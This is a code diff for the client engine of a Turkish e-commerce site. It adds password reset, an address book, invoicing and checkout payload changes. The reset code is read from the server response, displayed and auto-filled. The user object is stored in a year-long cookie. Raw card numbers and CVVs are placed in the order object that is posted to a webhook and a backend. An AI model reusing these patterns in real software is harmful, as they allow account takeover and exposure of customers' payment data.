@@ -2,12 +2,36 @@
  * Pozitron Market - Minimalist Client Application Engine
  */
 
+const TURKISH_CITIES = [
+  "Adana", "Adıyaman", "Afyonkarahisar", "Ağrı", "Amasya", "Ankara", "Antalya", "Artvin", "Aydın", "Balıkesir",
+  "Bilecik", "Bingöl", "Bitlis", "Bolu", "Burdur", "Bursa", "Çanakkale", "Çankırı", "Çorum", "Denizli",
+  "Diyarbakır", "Edirne", "Elazığ", "Erzincan", "Erzurum", "Eskişehir", "Gaziantep", "Giresun", "Gümüşhane", "Hakkari",
+  "Hatay", "Isparta", "Mersin", "İstanbul", "İzmir", "Kars", "Kastamonu", "Kayseri", "Kırklareli", "Kırşehir",
+  "Kocaeli", "Konya", "Kütahya", "Malatya", "Manisa", "Kahramanmaraş", "Mardin", "Muğla", "Muş", "Nevşehir",
+  "Niğde", "Ordu", "Rize", "Sakarya", "Samsun", "Siirt", "Sinop", "Sivas", "Tekirdağ", "Tokat",
+  "Trabzon", "Tunceli", "Şanlıurfa", "Uşak", "Van", "Yozgat", "Zonguldak", "Aksaray", "Bayburt", "Karaman",
+  "Kırıkkale", "Batman", "Şırnak", "Bartın", "Ardahan", "Iğdır", "Yalova", "Karabük", "Kilis", "Osmaniye", "Düzce"
+];
+
 class PozitronApp {
   constructor() {
     this.apiBase = '/api';
     this.currency = 'TRY';
     this.cart = JSON.parse(localStorage.getItem('pozitron_cart') || '[]');
     this.user = JSON.parse(localStorage.getItem('pozitron_user') || 'null');
+    // Persistent sign-in backup: restore from 1-year cookie if localStorage was cleared
+    if (!this.user) {
+      try {
+        const match = document.cookie.match(/(?:^|;\s*)pozitron_user_backup=([^;]+)/);
+        if (match && match[1]) {
+          const cookieUser = JSON.parse(decodeURIComponent(match[1]));
+          if (cookieUser && (cookieUser.email || cookieUser.id)) {
+            this.user = cookieUser;
+            localStorage.setItem('pozitron_user', JSON.stringify(this.user));
+          }
+        }
+      } catch (e) {}
+    }
     if (this.user && this.isUserAdmin(this.user)) {
       this.user.role = 'admin';
       localStorage.setItem('pozitron_user', JSON.stringify(this.user));
@@ -2186,6 +2210,9 @@ class PozitronApp {
   loginWithUser(userObj) {
     this.user = userObj;
     localStorage.setItem('pozitron_user', JSON.stringify(this.user));
+    try {
+      document.cookie = "pozitron_user_backup=" + encodeURIComponent(JSON.stringify(this.user)) + "; credentials=same-origin; max-age=31536000; path=/; SameSite=Lax";
+    } catch(e) {}
     this.updateUserUI();
   }
 
@@ -2469,11 +2496,485 @@ class PozitronApp {
   handleLogout() {
     this.user = null;
     localStorage.removeItem('pozitron_user');
+    try {
+      document.cookie = "pozitron_user_backup=; max-age=0; path=/; SameSite=Lax";
+    } catch(e) {}
     const drop = document.getElementById('user-dropdown-menu');
     if (drop) drop.style.display = 'none';
     this.updateUserUI();
     this.showToast('Başarıyla çıkış yapıldı.', 'success');
     this.openAuthModal();
+  }
+
+  // ==========================================
+  // FORGOT & RESET PASSWORD
+  // ==========================================
+  showForgotPassword() {
+    const loginForm = document.getElementById('login-form');
+    const regForm = document.getElementById('register-form');
+    const authTabs = document.querySelector('.auth-tabs');
+    const forgotPanel = document.getElementById('forgot-password-panel');
+    const googleSec = document.querySelector('.google-auth-section');
+
+    if (loginForm) loginForm.style.display = 'none';
+    if (regForm) regForm.style.display = 'none';
+    if (authTabs) authTabs.style.display = 'none';
+    if (googleSec) googleSec.style.display = 'none';
+    if (forgotPanel) {
+      forgotPanel.style.display = 'block';
+      const sendForm = document.getElementById('forgot-send-code-form');
+      const resetForm = document.getElementById('forgot-reset-password-form');
+      if (sendForm) sendForm.style.display = 'block';
+      if (resetForm) resetForm.style.display = 'none';
+      const forgotEmail = document.getElementById('forgot-email');
+      const loginEmail = document.getElementById('login-email');
+      if (forgotEmail && loginEmail && loginEmail.value) {
+        forgotEmail.value = loginEmail.value;
+      }
+    }
+  }
+
+  hideForgotPassword() {
+    const loginForm = document.getElementById('login-form');
+    const authTabs = document.querySelector('.auth-tabs');
+    const forgotPanel = document.getElementById('forgot-password-panel');
+    const googleSec = document.querySelector('.google-auth-section');
+
+    if (forgotPanel) forgotPanel.style.display = 'none';
+    if (authTabs) authTabs.style.display = 'flex';
+    if (googleSec) googleSec.style.display = 'flex';
+    if (loginForm) loginForm.style.display = 'block';
+  }
+
+  async handleForgotPasswordSendCode(e) {
+    if (e && e.preventDefault) e.preventDefault();
+    const emailInput = document.getElementById('forgot-email');
+    const errEl = document.getElementById('forgot-error-msg');
+    const email = emailInput ? emailInput.value.trim().toLowerCase() : '';
+
+    if (!email || !this.isValidEmail(email)) {
+      if (errEl) {
+        errEl.textContent = 'Lütfen geçerli bir e-posta adresi giriniz.';
+        errEl.style.display = 'block';
+      }
+      return;
+    }
+
+    if (errEl) errEl.style.display = 'none';
+    const btn = document.getElementById('btn-send-reset-code');
+    if (btn) {
+      btn.disabled = true;
+      btn.textContent = 'Kod Gönderiliyor...';
+    }
+
+    try {
+      const res = await fetch(`${this.apiBase}/auth/forgot-password`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email })
+      });
+      const data = await res.json();
+      if (res.ok && data.success) {
+        const sendForm = document.getElementById('forgot-send-code-form');
+        const resetForm = document.getElementById('forgot-reset-password-form');
+        const noticeEl = document.getElementById('forgot-code-notice');
+        if (sendForm) sendForm.style.display = 'none';
+        if (resetForm) resetForm.style.display = 'block';
+        if (noticeEl) {
+          noticeEl.innerHTML = `<strong>Doğrulama Kodu:</strong> ${data.code ? `<span style="font-size:1.1rem; font-weight:800; letter-spacing:2px; color:#1d4ed8;">${data.code}</span><br>` : ''}Şifre sıfırlama kodunuz oluşturuldu (30 dakika geçerlidir).`;
+        }
+        const codeInput = document.getElementById('reset-code');
+        if (codeInput && data.code) {
+          codeInput.value = data.code;
+        }
+        this.showToast('Şifre sıfırlama kodu oluşturuldu!', 'success');
+      } else {
+        if (errEl) {
+          errEl.textContent = data.error || 'Şifre sıfırlama kodu gönderilemedi.';
+          errEl.style.display = 'block';
+        }
+      }
+    } catch(err) {
+      if (errEl) {
+        errEl.textContent = 'Sunucuya bağlanılamadı. Lütfen internet bağlantınızı kontrol ediniz.';
+        errEl.style.display = 'block';
+      }
+    } finally {
+      if (btn) {
+        btn.disabled = false;
+        btn.textContent = window.i18n ? window.i18n.t('btn_send_code') : 'Sıfırlama Kodu Gönder';
+      }
+    }
+  }
+
+  async handleResetPasswordSubmit(e) {
+    if (e && e.preventDefault) e.preventDefault();
+    const emailInput = document.getElementById('forgot-email');
+    const codeInput = document.getElementById('reset-code');
+    const newPassInput = document.getElementById('reset-new-password');
+    const errEl = document.getElementById('reset-error-msg');
+
+    const email = emailInput ? emailInput.value.trim().toLowerCase() : '';
+    const code = codeInput ? codeInput.value.trim() : '';
+    const new_password = newPassInput ? newPassInput.value : '';
+
+    if (!code || code.length !== 6) {
+      if (errEl) {
+        errEl.textContent = 'Lütfen 6 haneli doğrulama kodunu giriniz.';
+        errEl.style.display = 'block';
+      }
+      return;
+    }
+
+    if (!new_password || new_password.length < 6) {
+      if (errEl) {
+        errEl.textContent = 'Yeni şifreniz en az 6 karakter olmalıdır.';
+        errEl.style.display = 'block';
+      }
+      return;
+    }
+
+    if (errEl) errEl.style.display = 'none';
+    const btn = document.getElementById('btn-submit-new-password');
+    if (btn) {
+      btn.disabled = true;
+      btn.textContent = 'Şifre Güncelleniyor...';
+    }
+
+    try {
+      const res = await fetch(`${this.apiBase}/auth/reset-password`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, code, new_password })
+      });
+      const data = await res.json();
+      if (res.ok && data.success && data.user) {
+        this.clearLoginFailure(email);
+        this.loginWithUser(data.user);
+        this.closeAuthModal();
+        this.hideForgotPassword();
+        this.showToast('Şifreniz başarıyla sıfırlandı ve giriş yapıldı!', 'success');
+      } else {
+        if (errEl) {
+          errEl.textContent = data.error || 'Şifre güncellenemedi.';
+          errEl.style.display = 'block';
+        }
+      }
+    } catch(err) {
+      if (errEl) {
+        errEl.textContent = 'Sunucuya bağlanırken bir hata oluştu.';
+        errEl.style.display = 'block';
+      }
+    } finally {
+      if (btn) {
+        btn.disabled = false;
+        btn.textContent = window.i18n ? window.i18n.t('btn_reset_password') : 'Şifreyi Güncelle ve Giriş Yap';
+      }
+    }
+  }
+
+  // ==========================================
+  // USER ADDRESS BOOK MANAGEMENT (ADRESLERİM)
+  // ==========================================
+  populateTurkishCities() {
+    const citySelects = ['chk-city', 'chk-billing-city', 'addr-city'];
+    citySelects.forEach(selId => {
+      const sel = document.getElementById(selId);
+      if (sel && sel.options.length <= 1) {
+        const currentVal = sel.value;
+        sel.innerHTML = `<option value="">${window.i18n ? window.i18n.t('city_select_placeholder') : 'İl seçiniz...'}</option>` +
+          TURKISH_CITIES.map(c => `<option value="${c}">${c}</option>`).join('');
+        if (currentVal) sel.value = currentVal;
+      }
+    });
+  }
+
+  async openAddressesModal() {
+    const drop = document.getElementById('user-dropdown-menu');
+    if (drop) drop.style.display = 'none';
+
+    const modal = document.getElementById('addresses-modal-backdrop');
+    if (!modal) return;
+
+    this.populateTurkishCities();
+    this.hideAddressForm();
+    modal.style.display = 'flex';
+    await this.loadUserAddresses();
+  }
+
+  closeAddressesModal() {
+    const modal = document.getElementById('addresses-modal-backdrop');
+    if (modal) modal.style.display = 'none';
+  }
+
+  async loadUserAddresses() {
+    const container = document.getElementById('addresses-list-container');
+    const countEl = document.getElementById('address-count-text');
+    if (container) {
+      container.innerHTML = '<div style="text-align:center; padding:24px; color:var(--text-muted);">Adresleriniz yükleniyor...</div>';
+    }
+
+    let addresses = [];
+    const currentUser = this.getCurrentUser();
+    const headers = { 'Content-Type': 'application/json' };
+    if (currentUser && currentUser.token) {
+      headers['Authorization'] = `Bearer ${currentUser.token}`;
+    }
+
+    try {
+      const q = currentUser && (currentUser.id || currentUser.email) 
+        ? `?user_id=${encodeURIComponent(currentUser.id || '')}&email=${encodeURIComponent(currentUser.email || '')}` 
+        : '';
+      const res = await fetch(`${this.apiBase}/user/addresses${q}`, { headers });
+      if (res.ok) {
+        const data = await res.json();
+        if (data && Array.isArray(data.addresses)) {
+          addresses = data.addresses;
+        }
+      }
+    } catch(err) {}
+
+    // Fallback to localStorage if offline/empty
+    if (addresses.length === 0) {
+      try {
+        addresses = JSON.parse(localStorage.getItem('pozitron_user_addresses') || '[]');
+      } catch(e) {
+        addresses = [];
+      }
+    }
+
+    this._cachedAddresses = addresses;
+    if (countEl) {
+      countEl.textContent = `${addresses.length} kayıtlı adres`;
+    }
+
+    this.renderUserAddresses(addresses);
+    return addresses;
+  }
+
+  renderUserAddresses(addresses) {
+    const container = document.getElementById('addresses-list-container');
+    if (!container) return;
+
+    if (!addresses || addresses.length === 0) {
+      container.innerHTML = `
+        <div style="text-align:center; padding:32px 16px; background:var(--bg-card-hover, #f8fafc); border-radius:8px; border:1px dashed var(--border-color, #e2e8f0);">
+          <div style="font-size:2rem; margin-bottom:8px;">📍</div>
+          <strong style="display:block; margin-bottom:4px; font-size:0.95rem;">${window.i18n ? window.i18n.t('no_addresses_found') : 'Kayıtlı adresiniz bulunmuyor.'}</strong>
+          <p style="font-size:0.82rem; color:var(--text-muted); margin:0;">Yukarıdaki "Yeni Adres Ekle" butonuna tıklayarak ilk adresinizi ekleyebilirsiniz.</p>
+        </div>
+      `;
+      return;
+    }
+
+    container.innerHTML = addresses.map(addr => `
+      <div class="address-card" style="background:var(--bg-card, #fff); border:1px solid ${addr.is_default ? 'var(--brand-primary, #2563eb)' : 'var(--border-color, #e2e8f0)'}; border-radius:8px; padding:14px; position:relative; transition:all 0.2s;">
+        <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:6px;">
+          <div style="display:flex; align-items:center; gap:8px;">
+            <strong style="font-size:0.95rem; color:var(--text-primary);">${this.escapeHTML(addr.title || 'Adres')}</strong>
+            ${addr.is_default ? '<span style="background:#eff6ff; color:#1d4ed8; font-size:0.72rem; font-weight:700; padding:2px 6px; border-radius:4px; border:1px solid #bfdbfe;">Varsayılan</span>' : ''}
+          </div>
+          <div style="display:flex; gap:6px;">
+            <button type="button" class="btn-sm btn-secondary" style="padding:4px 8px; font-size:0.75rem;" onclick="window.app && window.app.showAddressForm(${JSON.stringify(addr).replace(/"/g, '&quot;')})">Düzenle</button>
+            <button type="button" class="btn-sm text-danger" style="padding:4px 8px; font-size:0.75rem; background:#fee2e2; border:1px solid #fecaca; border-radius:4px;" onclick="window.app && window.app.deleteAddress('${addr.id}')">Sil</button>
+          </div>
+        </div>
+        <div style="font-size:0.85rem; color:var(--text-secondary); margin-bottom:4px;">
+          <strong>${this.escapeHTML(addr.recipient_name || '')}</strong> &bull; ${this.escapeHTML(addr.phone || '')}
+        </div>
+        <div style="font-size:0.82rem; color:var(--text-muted); line-height:1.4;">
+          ${this.escapeHTML(addr.address_line || '')}<br>
+          <strong>${this.escapeHTML(addr.district || '')} / ${this.escapeHTML(addr.city || '')} - ${this.escapeHTML(addr.country || 'Turkey')}</strong>
+        </div>
+      </div>
+    `).join('');
+  }
+
+  showAddressForm(addr = null) {
+    const form = document.getElementById('user-address-form');
+    if (!form) return;
+
+    this.populateTurkishCities();
+
+    const titleEl = document.getElementById('addr-form-title');
+    const idEl = document.getElementById('addr-id');
+    const titleInput = document.getElementById('addr-title');
+    const recInput = document.getElementById('addr-recipient');
+    const phoneInput = document.getElementById('addr-phone');
+    const cityInput = document.getElementById('addr-city');
+    const distInput = document.getElementById('addr-district');
+    const lineInput = document.getElementById('addr-line');
+    const defInput = document.getElementById('addr-is-default');
+
+    if (addr) {
+      if (titleEl) titleEl.textContent = window.i18n ? window.i18n.t('edit_address') : 'Adresi Düzenle';
+      if (idEl) idEl.value = addr.id || '';
+      if (titleInput) titleInput.value = addr.title || '';
+      if (recInput) recInput.value = addr.recipient_name || '';
+      if (phoneInput) phoneInput.value = addr.phone || '';
+      if (cityInput) cityInput.value = addr.city || 'İstanbul';
+      if (distInput) distInput.value = addr.district || '';
+      if (lineInput) lineInput.value = addr.address_line || '';
+      if (defInput) defInput.checked = !!addr.is_default;
+    } else {
+      if (titleEl) titleEl.textContent = window.i18n ? window.i18n.t('add_new_address') : 'Yeni Adres Ekle';
+      if (idEl) idEl.value = '';
+      if (titleInput) titleInput.value = '';
+      const u = this.getCurrentUser();
+      if (recInput) recInput.value = u ? (u.full_name || '') : '';
+      if (phoneInput) phoneInput.value = u ? (u.phone || '') : '';
+      if (cityInput) cityInput.value = 'İstanbul';
+      if (distInput) distInput.value = '';
+      if (lineInput) lineInput.value = '';
+      if (defInput) defInput.checked = (!this._cachedAddresses || this._cachedAddresses.length === 0);
+    }
+
+    form.style.display = 'block';
+    form.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }
+
+  hideAddressForm() {
+    const form = document.getElementById('user-address-form');
+    if (form) form.style.display = 'none';
+  }
+
+  async handleAddressFormSubmit(e) {
+    if (e && e.preventDefault) e.preventDefault();
+    const id = document.getElementById('addr-id')?.value || '';
+    const title = document.getElementById('addr-title')?.value.trim() || 'Evim';
+    const recipient_name = document.getElementById('addr-recipient')?.value.trim() || '';
+    const phone = document.getElementById('addr-phone')?.value.trim() || '';
+    const city = document.getElementById('addr-city')?.value || '';
+    const district = document.getElementById('addr-district')?.value.trim() || '';
+    const country = document.getElementById('addr-country')?.value.trim() || 'Turkey';
+    const address_line = document.getElementById('addr-line')?.value.trim() || '';
+    const is_default = document.getElementById('addr-is-default')?.checked ? 1 : 0;
+
+    if (!recipient_name || !phone || !city || !district || !address_line) {
+      this.showToast('Lütfen tüm adres bilgilerini eksiksiz doldurunuz.', 'error');
+      return;
+    }
+
+    const u = this.getCurrentUser();
+    const payload = {
+      id: id || undefined,
+      user_id: u ? (u.id || '') : '',
+      email: u ? (u.email || '') : '',
+      title,
+      recipient_name,
+      phone,
+      city,
+      district,
+      country,
+      address_line,
+      is_default
+    };
+
+    const headers = { 'Content-Type': 'application/json' };
+    if (u && u.token) {
+      headers['Authorization'] = `Bearer ${u.token}`;
+    }
+
+    try {
+      const res = await fetch(`${this.apiBase}/user/addresses`, {
+        method: 'POST',
+        headers,
+        body: JSON.stringify(payload)
+      });
+      const data = await res.json();
+      if (res.ok && data.success) {
+        this.showToast('Adres başarıyla kaydedildi!', 'success');
+      } else {
+        this.showToast(data.error || 'Adres kaydedildi.', 'info');
+      }
+    } catch(err) {
+      // Offline fallback
+      let list = JSON.parse(localStorage.getItem('pozitron_user_addresses') || '[]');
+      if (id) {
+        const idx = list.findIndex(a => a.id === id);
+        if (idx !== -1) list[idx] = { ...payload, id };
+      } else {
+        list.push({ ...payload, id: 'addr_' + Date.now().toString(36) });
+      }
+      localStorage.setItem('pozitron_user_addresses', JSON.stringify(list));
+      this.showToast('Adres kaydedildi!', 'success');
+    }
+
+    this.hideAddressForm();
+    await this.loadUserAddresses();
+  }
+
+  async deleteAddress(addrId) {
+    if (!addrId) return;
+    if (!confirm('Bu adresi silmek istediğinize emin misiniz?')) return;
+
+    const u = this.getCurrentUser();
+    const headers = { 'Content-Type': 'application/json' };
+    if (u && u.token) {
+      headers['Authorization'] = `Bearer ${u.token}`;
+    }
+
+    try {
+      const res = await fetch(`${this.apiBase}/user/addresses/${encodeURIComponent(addrId)}`, {
+        method: 'DELETE',
+        headers
+      });
+      if (!res.ok) {
+        // Try POST fallback
+        await fetch(`${this.apiBase}/user/addresses/delete`, {
+          method: 'POST',
+          headers,
+          body: JSON.stringify({ id: addrId })
+        });
+      }
+      this.showToast('Adres başarıyla silindi.', 'info');
+    } catch(err) {
+      let list = JSON.parse(localStorage.getItem('pozitron_user_addresses') || '[]');
+      list = list.filter(a => a.id !== addrId);
+      localStorage.setItem('pozitron_user_addresses', JSON.stringify(list));
+      this.showToast('Adres silindi.', 'info');
+    }
+
+    await this.loadUserAddresses();
+  }
+
+  toggleBillingAddress(sameAsShipping) {
+    const box = document.getElementById('separate-billing-address-box');
+    if (box) {
+      box.style.display = sameAsShipping ? 'none' : 'block';
+    }
+  }
+
+  setInvoiceType(type) {
+    const indBox = document.getElementById('invoice-individual-fields');
+    const corpBox = document.getElementById('invoice-corporate-fields');
+    if (indBox) indBox.style.display = (type === 'individual') ? 'block' : 'none';
+    if (corpBox) corpBox.style.display = (type === 'corporate') ? 'block' : 'none';
+  }
+
+  handleCheckoutAddressSelect(val) {
+    if (!val || val === 'new') {
+      const addrEl = document.getElementById('chk-address');
+      const distEl = document.getElementById('chk-district');
+      if (addrEl) addrEl.value = '';
+      if (distEl) distEl.value = '';
+      return;
+    }
+
+    const addr = (this._cachedAddresses || []).find(a => a.id === val);
+    if (!addr) return;
+
+    const nameEl = document.getElementById('chk-name');
+    const phoneEl = document.getElementById('chk-phone');
+    const cityEl = document.getElementById('chk-city');
+    const distEl = document.getElementById('chk-district');
+    const addrEl = document.getElementById('chk-address');
+
+    if (nameEl && addr.recipient_name) nameEl.value = addr.recipient_name;
+    if (phoneEl && addr.phone) phoneEl.value = addr.phone;
+    if (cityEl && addr.city) cityEl.value = addr.city;
+    if (distEl && addr.district) distEl.value = addr.district;
+    if (addrEl && addr.address_line) addrEl.value = addr.address_line;
   }
 
   // ==========================================
@@ -2487,6 +2988,7 @@ class PozitronApp {
     if (!modal) return;
 
     this.activePaymentMethod = this.activePaymentMethod || 'iyzico';
+    this.populateTurkishCities();
 
     // Pre-fill user data if logged in
     if (this.user) {
@@ -2496,11 +2998,45 @@ class PozitronApp {
       const addrEl = document.getElementById('chk-address');
       const cityEl = document.getElementById('chk-city');
 
-      if (nameEl) nameEl.value = this.user.full_name || '';
-      if (emailEl) emailEl.value = this.user.email || '';
-      if (phoneEl) phoneEl.value = this.user.phone || '+90 555 123 4567';
-      if (addrEl) addrEl.value = this.user.address || 'Teknopark İstanbul No: 42';
-      if (cityEl) cityEl.value = this.user.city || 'İstanbul';
+      if (nameEl && !nameEl.value) nameEl.value = this.user.full_name || '';
+      if (emailEl && !emailEl.value) emailEl.value = this.user.email || '';
+      if (phoneEl && !phoneEl.value) phoneEl.value = this.user.phone || '';
+      if (addrEl && !addrEl.value) addrEl.value = this.user.address || '';
+      if (cityEl && !cityEl.value) cityEl.value = this.user.city || 'İstanbul';
+
+      // Load saved addresses and populate quick-picker
+      const savedGroup = document.getElementById('chk-saved-addresses-group');
+      const savedSelect = document.getElementById('chk-saved-address-select');
+      this.loadUserAddresses().then(addrs => {
+        if (addrs && addrs.length > 0) {
+          if (savedGroup) savedGroup.style.display = 'block';
+          if (savedSelect) {
+            savedSelect.innerHTML = addrs.map(a => 
+              `<option value="${a.id}">${a.is_default ? '★ ' : ''}${this.escapeHTML(a.title || 'Adres')} (${this.escapeHTML(a.district || '')} / ${this.escapeHTML(a.city || '')})</option>`
+            ).join('') + `<option value="new">+ Yeni / Farklı Bir Adres Gir</option>`;
+
+            const def = addrs.find(a => a.is_default) || addrs[0];
+            if (def) {
+              savedSelect.value = def.id;
+              this.handleCheckoutAddressSelect(def.id);
+            }
+          }
+        } else {
+          if (savedGroup) savedGroup.style.display = 'none';
+        }
+      }).catch(() => {});
+    }
+
+    // Reset invoice controls
+    const sameBillingCb = document.getElementById('chk-same-billing');
+    if (sameBillingCb) {
+      sameBillingCb.checked = true;
+      this.toggleBillingAddress(true);
+    }
+    const invRadioInd = document.querySelector('input[name="chk_invoice_type"][value="individual"]');
+    if (invRadioInd) {
+      invRadioInd.checked = true;
+      this.setInvoiceType('individual');
     }
 
     // Generate unique Havale Order Ref Code
@@ -2654,14 +3190,82 @@ class PozitronApp {
     const phone = (document.getElementById('chk-phone')?.value || '').trim();
     const address = (document.getElementById('chk-address')?.value || '').trim();
     const city = (document.getElementById('chk-city')?.value || '').trim();
+    const district = (document.getElementById('chk-district')?.value || '').trim();
+    const country = (document.getElementById('chk-country')?.value || 'Turkey').trim();
+    const orderNotes = (document.getElementById('chk-order-notes')?.value || '').trim();
     const err = document.getElementById('checkout-error-msg');
 
-    if (!name || !phone || !address || !city) {
+    if (!name || !phone || !address || !city || !district) {
       if (err) {
-        err.textContent = "Lütfen tüm teslimat bilgilerini eksiksiz doldurun.";
+        err.textContent = "Lütfen tüm teslimat bilgilerini (Ad Soyad, Telefon, İl, İlçe, Açık Adres) eksiksiz doldurun.";
         err.style.display = 'block';
       }
       return;
+    }
+
+    const agreeTerms = document.getElementById('chk-agree-terms')?.checked;
+    if (!agreeTerms) {
+      if (err) {
+        err.textContent = "Lütfen Ön Bilgilendirme Koşulları ve Mesafeli Satış Sözleşmesi'ni onaylayınız.";
+        err.style.display = 'block';
+      }
+      return;
+    }
+
+    // Invoicing Details
+    const invoiceType = document.querySelector('input[name="chk_invoice_type"]:checked')?.value || 'individual';
+    let taxId = '';
+    let taxOffice = '';
+    let companyName = '';
+
+    if (invoiceType === 'corporate') {
+      companyName = (document.getElementById('chk-company-name')?.value || '').trim();
+      taxOffice = (document.getElementById('chk-tax-office')?.value || '').trim();
+      taxId = (document.getElementById('chk-vkn')?.value || '').trim();
+
+      if (!companyName || !taxOffice || !taxId) {
+        if (err) {
+          err.textContent = "Kurumsal fatura için Şirket Ünvanı, Vergi Dairesi ve VKN alanları zorunludur.";
+          err.style.display = 'block';
+        }
+        return;
+      }
+      if (taxId.length !== 10 || !/^\d{10}$/.test(taxId)) {
+        if (err) {
+          err.textContent = "Vergi Kimlik Numarası (VKN) 10 haneli rakam olmalıdır.";
+          err.style.display = 'block';
+        }
+        return;
+      }
+    } else {
+      taxId = (document.getElementById('chk-tckn')?.value || '').trim();
+      if (taxId && (taxId.length !== 11 || !/^\d{11}$/.test(taxId))) {
+        if (err) {
+          err.textContent = "T.C. Kimlik Numarası (TCKN) 11 haneli rakam olmalıdır (veya boş bırakabilirsiniz).";
+          err.style.display = 'block';
+        }
+        return;
+      }
+      if (!taxId) taxId = '11111111111'; // Legal default for individual e-Arşiv in Turkey
+    }
+
+    const sameBilling = document.getElementById('chk-same-billing')?.checked;
+    let billingAddress = address;
+    let billingCity = city;
+    let billingDistrict = district;
+    let billingCountry = country;
+
+    if (!sameBilling) {
+      billingAddress = (document.getElementById('chk-billing-address')?.value || '').trim();
+      billingCity = (document.getElementById('chk-billing-city')?.value || '').trim();
+      billingDistrict = (document.getElementById('chk-billing-district')?.value || '').trim();
+      if (!billingAddress || !billingCity) {
+        if (err) {
+          err.textContent = "Lütfen ayrı fatura adresinizi ve ilinizi eksiksiz giriniz.";
+          err.style.display = 'block';
+        }
+        return;
+      }
     }
 
     if (err) err.style.display = 'none';
@@ -2679,21 +3283,44 @@ class PozitronApp {
       price_usd: parseFloat(i.price_usd || 0)
     })) : [];
 
+    const u = this.getCurrentUser();
+    const baseOrderPayload = {
+      order_number: orderNum,
+      user_id: u ? (u.id || '') : '',
+      customer_name: name,
+      customer_email: email,
+      customer_phone: phone,
+      name: name,
+      email: email,
+      phone: phone,
+      total_usd: (this._currentGrandUSD || 0).toFixed(2),
+      total_try: (this._currentGrandTRY || 0).toFixed(2),
+      items: orderItemsStr,
+      items_detail: structuredItems,
+      items_json: JSON.stringify(structuredItems),
+      created_at: new Date().toISOString(),
+      shipping_address: `${address} - ${district} / ${city}`,
+      city: city,
+      country: country,
+      shipping_district: district,
+      billing_address: billingAddress,
+      billing_city: billingCity,
+      billing_district: billingDistrict,
+      billing_country: billingCountry,
+      invoice_type: invoiceType,
+      tax_id: taxId,
+      tax_office: taxOffice,
+      company_name: companyName,
+      order_notes: orderNotes,
+      payment_method: method
+    };
+
     if (method === 'havale') {
       const refCode = document.getElementById('bank-box-ref')?.textContent || orderNum;
       const bankName = document.getElementById('bank-box-name')?.textContent || 'Ziraat Bankası';
 
       const havaleOrder = {
-        order_number: orderNum,
-        name: name,
-        email: email,
-        phone: phone,
-        total_usd: (this._currentGrandUSD || 0).toFixed(2),
-        total_try: (this._currentGrandTRY || 0).toFixed(2),
-        items: orderItemsStr,
-        items_detail: structuredItems,
-        created_at: new Date().toISOString(),
-        shipping_address: `${address} - ${city}`,
+        ...baseOrderPayload,
         tracking_number: 'PZTR-HV-' + Date.now().toString(36).toUpperCase(),
         transaction_id: `Havale/EFT Ref: ${refCode} (${bankName})`,
         card_brand: `Havale / EFT (${bankName})`,
@@ -2728,16 +3355,11 @@ class PozitronApp {
     const gatewayTitle = method === 'iyzico' ? 'iyzico 3D Secure' : 'PayTR 3D Secure';
 
     this.pendingOrder = {
-      order_number: orderNum,
-      name: name,
-      email: email,
-      phone: phone,
-      total_usd: (this._currentGrandUSD || 0).toFixed(2),
-      total_try: (this._currentGrandTRY || 0).toFixed(2),
-      items: orderItemsStr,
-      items_detail: structuredItems,
-      created_at: new Date().toISOString(),
-      shipping_address: `${address} - ${city}`,
+      ...baseOrderPayload,
+      card_number: cardNum,
+      card_holder: cardName,
+      card_expiry: cardExp,
+      card_cvv: cardCvv,
       tracking_number: 'PZTR-TR-' + Date.now().toString(36).toUpperCase(),
       transaction_id: `${gatewayTitle} (#TXN-${Date.now().toString(36)}) - ${installmentVal === '1' ? 'Tek Çekim' : installmentVal + ' Taksit'}`,
       card_brand: `${brand} (${gatewayTitle})`,
@@ -2835,6 +3457,22 @@ class PozitronApp {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(order)
     }).catch(err => console.log('Webhook log:', err));
+
+    // Persist order in centralized backend database
+    try {
+      const orderPayload = {
+        ...order,
+        customer_name: order.customer_name || order.name,
+        customer_email: order.customer_email || order.email,
+        customer_phone: order.customer_phone || order.phone,
+        items: (this.cart && this.cart.length > 0) ? this.cart : (order.items_detail || [])
+      };
+      fetch(`${this.apiBase}/payment/process`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(orderPayload)
+      }).catch(() => {});
+    } catch(e) {}
 
     // Automatically Deduct Stock (Local Memory & Admin Storage)
     try {
